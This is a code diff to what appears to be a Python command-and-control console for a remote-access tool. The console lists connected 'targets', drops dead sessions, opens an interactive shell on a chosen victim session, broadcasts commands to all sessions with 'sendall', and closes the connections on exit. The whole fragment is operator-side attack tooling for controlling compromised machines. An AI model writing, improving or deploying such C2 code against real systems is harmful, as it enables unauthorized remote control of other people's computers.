@@ -45,10 +45,21 @@ t1.start()
 while True:
     command = input("CENTER ~ ")
     if command == "targets":
-        count = 0
-        for ip in ips:
-            print(f"Session {count} --  {ip}")
-            count += 1
+        closed_targets = []
+        closed_ips = []
+        for i in range(len(targets)):
+            target_socket = targets[i]
+            target_ip = ips[i]
+            try:
+                utils.reliable_send(target_socket, "q")
+            except:
+                closed_targets.append(target_socket)
+                closed_ips.append(target_ip)
+        targets = [e for e in targets if e not in closed_targets]
+        ips = [e for e in ips if e not in closed_ips]
+        for i in range(len(targets)):
+            print(f"Session {i} --  {ips[i]}")
+
     if command[:7] == "session":
         try:
             num = int(command[8:])
@@ -56,7 +67,7 @@ while True:
             target_ip = ips[num]
             utils.start_shell(target_socket,target_ip)
         except Exception as e:
-            print(str(e))
+            print("Invalid session number!")
     if command [:7] == "sendall":
         targets_len = len(targets)
         for i in range(0,targets_len):
@@ -68,8 +79,7 @@ while True:
         print(utils.help_message)
     if command == "exit":
         for target in targets:
-            utils.reliable_send(target_socket, "close")
-            target.close()
+            utils.reliable_send(target, "close")
         s.close()
         stop_threads = True
         t1.join()
